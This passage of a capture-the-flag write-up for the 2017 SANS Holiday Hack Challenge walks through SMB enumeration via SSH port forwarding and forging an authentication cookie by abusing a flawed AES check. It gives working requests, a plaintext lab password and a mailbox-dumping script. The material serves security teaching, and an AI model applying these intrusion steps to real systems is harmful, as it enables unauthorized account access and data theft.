445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-emi
| Not valid before: 2017-11-06T13:51:23
|_Not valid after:  2018-05-08T13:51:23
|_ssl-date: 2018-01-08T02:54:30+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=hhc17-emi
| Subject Alternative Name: DNS:hhc17-emi
| Not valid before: 2017-11-07T13:52:11
|_Not valid after:  2018-11-07T13:52:11
|_ssl-date: 2018-01-08T02:54:30+00:00; 0s from scanner time.
49666/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: HHC17-EMI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:07 (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.99 seconds
</pre>

<p>
So it does indeed seem to be an SMB server. A command-line tool to access it is <code>smbclient</code>:
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ smbclient -L 10.142.0.7 -U alabaster_snowball
rbash: smbclient: command not found
</pre>

<p>
It's not available on <code>l2s</code>. Another option is forwarding a port through SSH:
</p>

<pre class="example">
user@vps $ ssh alabaster_snowball@l2s.northpolechristmastown.com -O forward -L 4445:10.142.0.7:445
</pre>

<p>
Now we can access port 445 on <code>hhc17-smb-server</code> via port 4445 on <code>localhost</code>:
</p>

<pre class="example">
user@vps $ smbclient -L localhost -p 4445 -U alabaster_snowball
WARNING: The "syslog" option is deprecated
Enter alabaster_snowball's password: 
Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	FileStor        Disk
	IPC$            IPC       Remote IPC
Connection to localhost failed (Error NT_STATUS_CONNECTION_REFUSED)
NetBIOS over TCP disabled -- no workgroup available
</pre>

<p>
<code>FileStor</code> looks interesting. Let's see what's on it:
</p>

<pre class="example">
user@vps $ smbclient //localhost/FileStor -p 4445 -U alabaster_snowball
WARNING: The "syslog" option is deprecated
Enter alabaster_snowball's password:
Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
smb: \&gt; ls
  .                                   D        0  Wed Dec  6 16:51:46 2017
  ..                                  D        0  Wed Dec  6 16:51:46 2017
  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 16:44:17 2017
  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 14:21:44 2017
  MEMO - Calculator Access for Wunorse.docx      A   111852  Mon Nov 27 14:01:36 2017
  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 16:47:28 2017
  Naughty and Nice List.csv           A    10245  Thu Nov 30 14:42:00 2017
  Naughty and Nice List.docx          A    60344  Wed Dec  6 16:51:25 2017

		13106687 blocks of size 4096. 9624115 blocks available
smb: \&gt; mget *
getting file \BOLO - Munchkin Mole Report.docx of size 255520 as BOLO - Munchkin Mole Report.docx (1094.4 KiloBytes/sec) (average 1094.4 KiloBytes/sec)
getting file \GreatBookPage3.pdf of size 1275756 as GreatBookPage3.pdf (2818.7 KiloBytes/sec) (average 2231.9 KiloBytes/sec)
getting file \MEMO - Calculator Access for Wunorse.docx of size 111852 as MEMO - Calculator Access for Wunorse.docx (666.0 KiloBytes/sec) (average 1924.0 KiloBytes/sec)
getting file \MEMO - Password Policy Reminder.docx of size 133295 as MEMO - Password Policy Reminder.docx (834.4 KiloBytes/sec) (average 1752.3 KiloBytes/sec)
getting file \Naughty and Nice List.csv of size 10245 as Naughty and Nice List.csv (99.1 KiloBytes/sec) (average 1599.3 KiloBytes/sec)
getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.docx (390.3 KiloBytes/sec) (average 1452.3 KiloBytes/sec)
</pre>
</div>
</div>

<div id="outline-container-org055f9bd" class="outline-4">
<h4 id="q3_solution"><a id="org055f9bd"></a>Solution</h4>
<div class="outline-text-4" id="text-q3_solution">
<p>
We used <code>nmap</code> to list our targets, and found <code>hhc17-smb-server</code>. We
used SSH forwarding to connect to it with <code>smbclient</code>. We used the
credentials we found for question 2 to connect.
</p>
</div>
</div>

<div id="outline-container-orgba9e447" class="outline-4">
<h4 id="q3_common-pitfalls"><a id="orgba9e447"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-q3_common-pitfalls">
<p>
It looks like <code>hhc17-smb-server</code> blocks pings. By default, <code>nmap</code> uses
pings to determine which hosts are up, and which it should scan
further. We used the "list scan," which just did reverse DNS queries,
and were able to identify the system quickly. If, however, someone
just tried to run <code>nmap -p 445 10.142.0.0/24</code>, they wouldn't find the system.
</p>

<p>
It also looked like two systems were mixed up in NetBIOS and RDP SSL cert names:
</p>

<pre class="example">
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
...
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-emi
...
Host script results:
| nbstat: NetBIOS name: HHC17-EMI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:07 (unknown)
...
Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
...
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-smb-server
...
Host script results:
| nbstat: NetBIOS name: HHC17-SMB-SERVE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:08 (unknown)
</pre>
</div>
</div>
</div>
<div id="outline-container-org1b14128" class="outline-3">
<h3 id="org1b14128">EWA: Elf Web Access</h3>
<div class="outline-text-3" id="text-org1b14128">
</div>
<div id="outline-container-org2c79298" class="outline-4">
<h4 id="q4_question"><a id="org2c79298"></a>Question</h4>
<div class="outline-text-4" id="text-q4_question">
<p>
Elf Web Access (EWA) is the preferred mailer for North Pole elves,
available internally at <a href="http://mail.northpolechristmastown.com/">http://mail.northpolechristmastown.com/</a>. What
can you learn from The Great Book page found in an e-mail on that
server?
</p>
</div>
</div>

<div id="outline-container-org404aef0" class="outline-4">
<h4 id="q4_background-information"><a id="org404aef0"></a>Background Information</h4>
<div class="outline-text-4" id="text-q4_background-information">
<p>
Hints:
</p>

<p>
Pepper Minstix gives us the following hints:
</p>

<ol class="org-ol">
<li>I'm so excited for the new email system that Alabaster Snowball set up for us. He spent a lot of time working on it. Should make it very easy for us to share cookie recipes. I just hope that he cleared up all his dev files. I know he was working on keeping the dev files from search engine indexers.</li>
<li>The new email system's authentication should be impenetrable. Alabaster was telling me that he came up with his own encryption scheme using AES256, so you know it's secure.</li>
<li>AES256? Honestly, I don't know much about it, but Alabaster explained the basic idea and it sounded easy. During decryption, the first 16 bytes are removed and used as the initialization vector or "IV." Then the IV + the secret key are used with AES256 to decrypt the remaining bytes of the encrypted string.</li>
<li>Hmmm. That's a good question, I'm not sure what would happen if the encrypted string was only 16 bytes long.</li>
<li>Every year when Santa gets back from delivering presents to the good girls and boys, he tells us stories about all the cookies he receives. I love everything about cookies! Cooking them, eating them, editing them, decorating them, you name it!</li>
</ol>
</div>
</div>

<div id="outline-container-org79a146f" class="outline-4">
<h4 id="q4_goal"><a id="org79a146f"></a>Goal</h4>
<div class="outline-text-4" id="text-q4_goal">
<p>
The question tells us that the page we're looking for is in an e-mail. So, we need to figure out some way to login to the mail system and find the crucial message.
</p>
</div>
</div>

<div id="outline-container-orga2d5334" class="outline-4">
<h4 id="q4_approach"><a id="orga2d5334"></a>Approach</h4>
<div class="outline-text-4" id="text-q4_approach">
<p>
First off, let's pull up the website in our web browser. SSH can run a
SOCKS proxy for us, which we can use to tunnel our traffic through
l2s. We use the access we got in Question 2 to SSH in:
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -D 31080 alabaster_snowball@l2s.northpolechristmastown.com
</pre>
</div>

<p>
I like to use Firefox for this, since, unlike Chrome, we can configure proxy settings different from the system-wide settings:
</p>


<div class="figure">
<p><img src="./images/firefox_proxy.png" alt="firefox_proxy.png" width="500px" />
</p>
<p><span class="figure-number">Figure 12: </span>Elf Web Access</p>
</div>

<p>
Now we can just navigate to <a href="http://mail.northpolechristmastown.com/">http://mail.northpolechristmastown.com/</a>:
</p>


<div class="figure">
<p><img src="./images/ewa.png" alt="ewa.png" width="350px" />
</p>
<p><span class="figure-number">Figure 13: </span>Elf Web Access</p>
</div>

<p>
Luckily, we got Alabaster's password in Question 2, so let's login!
</p>


<div class="figure">
<p><img src="./images/bad_email.png" alt="bad_email.png" width="500px" />
</p>
<p><span class="figure-number">Figure 14: </span>Logging in as alabaster_snowball/stream_unhappy_buy_loss</p>
</div>

<p>
Of course! We need an e-mail address:
</p>


<div class="figure">
<p><img src="./images/bad_username.png" alt="bad_username.png" width="500px" />
</p>
<p><span class="figure-number">Figure 15: </span>Logging in as alabaster_snowball@northpolechristmastown.com/stream_unhappy_buy_loss</p>
</div>

<p>
Luckily, the error message tells us how we need to format the e-mail address:
</p>


<div class="figure">
<p><img src="./images/bad_password.png" alt="bad_password.png" width="500px" />
</p>
<p><span class="figure-number">Figure 16: </span>Logging in as alabaster_snowball@northpolechristmastown.com/stream_unhappy_buy_loss</p>
</div>

<p>
Curses! Looks like Alabaster is at least smart enough to not reuse credentials. At least he's following the password policy:
</p>


<div class="figure">
<p><img src="./images/password_policy.png" alt="password_policy.png" width="500px" />
</p>
<p><span class="figure-number">Figure 17: </span>MEMO - Password Policy Reminder.docx from the SMB FileStor</p>
</div>

<p>
Let's review some of the hints that Pepper gave us:
</p>

<blockquote>
<p>
I just hope that he cleared up all his dev files. I know he was working on keeping the dev files from search engine indexers.
</p>
</blockquote>

<p>
We scanned this EWA system with <code>nmap</code> before, and one of the <code>nmap</code> scripts did find a reference in <code>robots.txt</code>:
</p>

<pre class="example">
80/tcp   open  http
| http-robots.txt: 1 disallowed entry
|_/cookie.txt
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</pre>

<p>
Given how much Pepper harps on cookies, perhaps this file is worth investigating. When we view it, we see:
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">FOUND THESE FOR creating and validating cookies. Going to use this in node js</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">cookie_maker</span>(<span style="color: #f0c674;">username</span>, <span style="color: #f0c674;">callback</span>){
    <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">key</span> = <span style="color: #8abeb7;">'need to put any length key in here'</span>;
    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">randomly generates a string of 5 characters</span>
    <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">plaintext</span> = rando_string(5)
    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters</span>
    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.</span>
    <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">ciphertext</span> = aes256.encrypt(key, plaintext).replace(<span style="color: #8abeb7;">/\=/</span>g,<span style="color: #8abeb7;">''</span>);
    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Setting the values of the cookie.</span>
    <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">acookie</span> = [<span style="color: #8abeb7;">'IOTECHWEBMAIL'</span>,JSON.stringify({<span style="color: #8abeb7;">"name"</span>:username, <span style="color: #8abeb7;">"plaintext"</span>:plaintext,  <span style="color: #8abeb7;">"ciphertext"</span>:ciphertext}), { maxAge: 86400000, httpOnly: <span style="color: #81a2be;">true</span>, encode: String }]
    <span style="color: #b5bd68;">return</span> callback(acookie);
};
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">cookie_checker</span>(<span style="color: #f0c674;">req</span>, <span style="color: #f0c674;">callback</span>){
    <span style="color: #b5bd68;">try</span>{
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">key</span> = <span style="color: #8abeb7;">'need to put any length key in here'</span>;
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Retrieving the cookie from the request headers and parsing it as JSON</span>
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">thecookie</span> = JSON.parse(req.cookies.IOTECHWEBMAIL);
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Retrieving the cipher text </span>
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">ciphertext</span> = thecookie.ciphertext;
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">Retrievingin the username</span>
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">username</span> = thecookie.name
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">retrieving the plaintext</span>
        <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">plaintext</span> = aes256.decrypt(key, ciphertext);
        <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key</span>
        <span style="color: #b5bd68;">if</span> (plaintext === thecookie.plaintext) {
            <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">true</span>, username);
        } <span style="color: #b5bd68;">else</span> {
            <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">false</span>, <span style="color: #8abeb7;">''</span>);
        }
    } <span style="color: #b5bd68;">catch</span> (e) {
        console.log(e);
        <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">false</span>, <span style="color: #8abeb7;">''</span>);
    }
};
</pre>
</div>

<p>
There's a lot to parse here, but given the number of times AES and IVs are mentioned in the hints, this looks like we're on the right path.
</p>

<p>
Our next hint is:
</p>

<blockquote>
<p>
The new email system's authentication should be impenetrable. Alabaster was telling me that he came up with his own encryption scheme using AES256, so you know it's secure.
</p>
</blockquote>

<p>
Uh-oh&#x2026; Coming up with your own cryptography scheme should send up all the red flags.
</p>

<blockquote>
<p>
Happy families are all alike; every unhappy family is unhappy in its own way. &#x2013;   Leo Tolstoy
</p>
</blockquote>

<blockquote>
<p>
Empty plaintext encrypted without using HMAC are all alike; Rolling your own crypto makes all cryptographers unhappy. &#x2013; Justin Azoff
</p>
</blockquote>

<p>
At this point, we suspect that there's some kind of vulnerability in the cryptography being used. Reading on:
</p>

<blockquote>
<p>
AES256? Honestly, I don't know much about it, but Alabaster explained
the basic idea and it sounded easy. During decryption, the first 16
bytes are removed and used as the initialization vector or "IV." Then
the IV + the secret key are used with AES256 to decrypt the remaining
bytes of the encrypted string.
</p>
</blockquote>

<p>
Let's pause for a moment to review what we know so far. The e-mail application uses cookies for authentication.
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">acookie</span> = [<span style="color: #8abeb7;">'IOTECHWEBMAIL'</span>,JSON.stringify({<span style="color: #8abeb7;">"name"</span>:username, <span style="color: #8abeb7;">"plaintext"</span>:plaintext,  <span style="color: #8abeb7;">"ciphertext"</span>:ciphertext}), 
               { maxAge: 86400000, httpOnly: <span style="color: #81a2be;">true</span>, encode: String }]
</pre>
</div>

<p>
As we can see from the line above, the cookie contains a username,
some plaintext, and some ciphertext. The <code>cookie_checker</code> function
takes the encrypted ciphertext, and attempts to decrypt it with a
secret key that only the application has. If the result matches the
plaintext from the cookie, the cookie is authentic:
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">plaintext</span> = aes256.decrypt(key, ciphertext);
<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key</span>
<span style="color: #b5bd68;">if</span> (plaintext === thecookie.plaintext) {
    <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">true</span>, username);
} <span style="color: #b5bd68;">else</span> {
    <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">false</span>, <span style="color: #8abeb7;">''</span>);
}
</pre>
</div>

<p>
The code, as well as Pepper's hints, tell us something about the structure of the ciphertext:
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">makes the string into cipher text .... in base64. </span>
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters</span>
</pre>
</div>

<p>
Finally, Pepper gives us this tantalizing hint:
</p>

<blockquote>
<p>
Hmmm. That's a good question, I'm not sure what would happen if the encrypted string was only 16 bytes long.
</p>
</blockquote>

<p>
By reading the code closely we can see that when the application <b>creates</b> a cookie, the plaintext is 5 random characters. However, nothing in the verification logic requires this. The only check is:
</p>

<div class="org-src-container">
<pre class="src src-js">aes256.decrypt(key, ciphertext) === thecookie.plaintext
</pre>
</div>

<p>
Let's see what a valid cookie looks like:
</p>

<pre class="example">
$ http --proxy=http:socks5://@localhost:31080 'http://mail.northpolechristmastown.com/'
HTTP/1.1 200 OK
...
Server: nginx/1.10.3 (Ubuntu)
Set-Cookie: EWA={"name":"GUEST","plaintext":"","ciphertext":""}; Max-Age=86400; Path=/; Expires=Wed, 10 Jan 2018 23:37:29 GMT; HttpOnly
...
</pre>

<p>
Let's try what Pepper Minstix suggests: setting our ciphertext to only
be 16 characters long. We know that this is base64 encoded, so we'll
run:
</p>

<pre class="example">
$ echo -n "Security at NCSA" | base64
U2VjdXJpdHkgYXQgTkNTQQ==
</pre>

<p>
We're using the <code>-n</code> flag of <code>echo</code> to not have a newline at the end, which would give us a 17 character length cookie.
</p>

<pre class="example">
$ http --proxy=http:socks5://@localhost:31080 'http://mail.northpolechristmastown.com/' 
  'Cookie:EWA={"name":"alabaster.snowball@northpolechristmastown.com","ciphertext":"U2VjdXJpdHkgYXQgTkNTQQ==","plaintext":""}'
HTTP/1.1 200 OK
...
X-Powered-By: Express

&lt;script&gt;window.location.href='/account.html'&lt;/script&gt;
</pre>

<p>
That looks promising! Let's move from the command line back to Firefox. One easy way to edit cookies in Firefox is to go to Tools <code>&gt; Web Developer =&gt; Storage Inspector. We should see an =EWA</code> cookie in there already, and we can simply double-click the value field and paste in our forged cookie:
</p>

<pre class="example">
{"name":"alabaster.snowball@northpolechristmastown.com","ciphertext":"U2VjdXJpdHkgYXQgTkNTQQ==","plaintext":""}
</pre>

<p>
Now we just reload the page, and we're in!
</p>


<div class="figure">
<p><img src="./images/ewa_loggedin.png" alt="ewa_loggedin.png" width="500px" />
</p>
<p><span class="figure-number">Figure 18: </span>Logging in with our forged cookie</p>
</div>

<p>
At this point, we can start digging through Alabaster's e-mail. Soon, we find this:
</p>


<div class="figure">
<p><img src="./images/page4_email.png" alt="page4_email.png" width="500px" />
</p>
<p><span class="figure-number">Figure 19: </span>Page 4 E-mail</p>
</div>
</div>

<ul class="org-ul">
<li><a id="orge8b8981"></a>An Alternative Solution: Black Box Cracking<br />
<div class="outline-text-6" id="text-orge8b8981">
<p>
Given some of the discussion in the chat, this was one of the hardest
questions. This section goes deeper into the cookie creation and
validation code, and it offers an alternative solution. Finding
<code>cookie.txt</code> from the <code>robots.txt</code> file made this question much
easier, but this version lays out the approach to solve this question
without that file. Independently, one of our team members used the
previous solution, and one used this solution.
</p>

<p>
The Javascript code used is a variation of a challenge response
algorithm, but it is flawed in that the client is providing both the
challenge and the response.  It is also flawed in that it does not use
MAC
<a href="https://en.wikipedia.org/wiki/Authenticated_encryption#MAC-then-Encrypt_(MtE)">https://en.wikipedia.org/wiki/Authenticated_encryption#MAC-then-Encrypt_(MtE)</a>
meaning that the encrypted contents themselves are never verified.
</p>

<p>
Since we can control both the ciphertext and the expected plaintext, we can
just set the challenge to the empty string "" and the response then just needs
to be ANY message that decrypts to "".  Since the message is empty, the key is
irrelevant, we just need to work out how to properly generate a ciphertext that
will decrypt to nothing.
</p>

<p>
A completely empty ciphertext throws an error:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">aes256</span> = require(<span style="color: #8abeb7;">'aes256'</span>);
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">''</span>)
TypeError: Provided <span style="color: #8abeb7;">"encrypted"</span> must be a non-empty string
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:68:13)
</pre>
</div>

<p>
A larger ciphertext works, but gives us a random string, which is not what we want.. but 
we can see that a fairly long cipher text only gives us a few bytes of plaintext&#x2026;
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)
<span style="color: #8abeb7;">'F..%=X..'</span>
</pre>
</div>

<p>
The difference in the length of the two strings is 24:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; x=<span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>
&gt; x.length - aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>,x).length
24
</pre>
</div>

<p>
From the hints, we learn that some of the bytes are used for the IV.
</p>

<p>
The AES library won't let us encrypt an empty string, but we can encrypt a single char:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; aes256.encrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">''</span>)
TypeError: Provided <span style="color: #8abeb7;">"plaintext"</span> must be a non-empty string
    at Object.encrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:39:13)
&gt; aes256.encrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'x'</span>)
<span style="color: #8abeb7;">'L7rwNMwISl2chavT6lILlNM='</span>
&gt; aes256.encrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'x'</span>).length
24
</pre>
</div>

<p>
This gives a ciphertext of length 24 with one byte of = for padding.  This
means that 22 bytes are used for the IV and one byte is used to encrypt the 'x'
itself.
</p>

<p>
So, at this point it is clear that something interesting happens around 22-24 chars.
</p>

<p>
Trying different lengths approaching a length of 22 continues to throw an error
for a while&#x2026;
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaa'</span>)
TypeError: Provided <span style="color: #8abeb7;">"encrypted"</span> must be a non-empty string
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:68:13)
</pre>
</div>

<p>
Until the error changes:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="color: #8abeb7;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaa'</span>)
<span style="color: #8abeb7;">''</span>
&gt; <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaa'</span>.length
22
&gt; aes256.decrypt(<span style="color: #8abeb7;">'key really does not matter'</span>, <span style="color: #8abeb7;">'aaaaaaaaaaaaaaaaaaaaaa'</span>)
<span style="color: #8abeb7;">''</span>
</pre>
</div>

<p>
Success!  A string of any 22 chars will decrypt to the empty string.
</p>

<p>
An alternative approach would be to edit the aes library and comment out this block:
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">if</span> (<span style="color: #b5bd68;">typeof</span> plaintext !== <span style="color: #8abeb7;">'string'</span> || !plaintext) {
  <span style="color: #b5bd68;">throw</span> <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">TypeError</span>(<span style="color: #8abeb7;">'Provided "plaintext" must be a non-empty string'</span>);
}
</pre>
</div>

<p>
With the throw commented out, we can encrypt an empty string:
</p>

<div class="org-src-container">
<pre class="src src-js">&gt; <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">aes256</span> = require(<span style="color: #8abeb7;">'aes256'</span>);
&gt; aes256.encrypt(<span style="color: #8abeb7;">'whatever'</span>, <span style="color: #8abeb7;">''</span>)
<span style="color: #8abeb7;">'SStLU1QxLjmtG/Ea8hMH0Q=='</span>
&gt; ct=aes256.encrypt(<span style="color: #8abeb7;">'whatever'</span>, <span style="color: #8abeb7;">''</span>)
<span style="color: #8abeb7;">'tYcVb4PRsdq4JWl5XMSNgw=='</span>
&gt; aes256.decrypt(<span style="color: #8abeb7;">'a different key entirely'</span>, ct)
<span style="color: #8abeb7;">''</span>
&gt; ct.length
24
</pre>
</div>

<p>
The length is different(24 instead of 22), but only because it is padded with 2
bytes of == for base64 purposes.
</p>
</div>
</li>

<li><a id="org4aeacf6"></a>Tool Development<br />
<div class="outline-text-6" id="text-org4aeacf6">
<p>
We created a script, TODO LINK TO EWA SCRIPT, which will forge a
cookie to login as a user, and then dump all the e-mails as JSON. In
order to do this, we relied heavily on
<a href="http://mail.northpolechristmastown.com/js/custom.js">http://mail.northpolechristmastown.com/js/custom.js</a> to see how the API
worked, and duplicated portions of it in Python. This script allowed
us to archive and search e-mails, which was useful for future
questions.
</p>

<pre class="example">
$ ./ewa.py alabaster.snowball &gt; alabaster_inbox.json
$ cat alabaster_inbox.json | jq '.INBOX[].HEADERS.body.subject' -c
["Welcome"]
["Re: Welcome"]
["Re: gingerbread cookie recipe"]
["COOKIES!"]
["Re: COOKIES!"]
["Re: COOKIES!"]
["Re: COOKIES!"]
["Re: COOKIES!"]
["Re: COOKIES!"]
["Christmas Party!"]
["Re: Christmas Party!"]
["Re: Christmas Party!"]
["Re: Christmas Party!"]
["Re: Christmas Party!"]
["Should we be worried?"]
["Re: Should we be worried?"]
["Re: Should we be worried?"]
["Lost book page"]
["Re: Lost book page"]
["Re: Lost book page"]
["Re: Lost book page"]
</pre>
</div>
</li>
</ul>
</div>

<div id="outline-container-org1f499d3" class="outline-4">
<h4 id="q4_solution"><a id="org1f499d3"></a>Solution</h4>
<div class="outline-text-4" id="text-q4_solution">
<p>
Alabaster Snowball had a vulnerability in his cookie validation code,
where he wasn't verifying the length of the decrypted text. AES will
encrypt an empty string as an empty string, so we can forge a cookie
without needing to know the key. With this forged cookie, we can login
to Alabaster's e-mail, and find an e-mail with a link to the page
we're looking for.
</p>
</div>
</div>

<div id="outline-container-org093a210" class="outline-4">
<h4 id="q4_alternatives"><a id="org093a210"></a>Alternatives</h4>
<div class="outline-text-4" id="text-q4_alternatives">
<p>
If only we could crack Alabaster's password, we wouldn't need to forge
any cookies. But more on that later&#x2026;
